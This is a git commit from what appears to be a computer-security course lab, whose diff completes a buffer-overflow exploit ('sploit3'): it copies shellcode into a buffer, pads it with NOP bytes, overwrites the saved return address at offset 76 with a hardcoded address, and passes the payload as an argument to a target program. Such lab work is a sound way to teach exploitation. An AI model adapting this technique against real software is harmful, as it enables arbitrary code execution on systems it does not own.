864365228f658b3d4c7f8e110da369cdf6e712dd
Benjamin Cheng <ben@bcheng.me>
2022-09-20 18:20:54 -0400

    lab1/sploit3: working exploit code

--- lab1/sploits/sploit3.c
+++ lab1/sploits/sploit3.c
@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
@@ -12,8 +13,16 @@ main ( int argc, char * argv[] )
     char *    args[3];
     char *    env[1];
 
+    uint8_t input[370];
+    memcpy(input, shellcode, sizeof(shellcode));
+    for (int i = sizeof(shellcode) - 1; i < 76; i++) {
+        input[i] = 0x90;
+    }
+    uint64_t *return_address = (uint64_t *) &input[76];
+    *return_address = 0x40a4fe4c;
+
     args[0] = TARGET;
-    args[1] = "hi there";
+    args[1] = (char *) input;
     args[2] = NULL;
 
     env[0] = NULL;
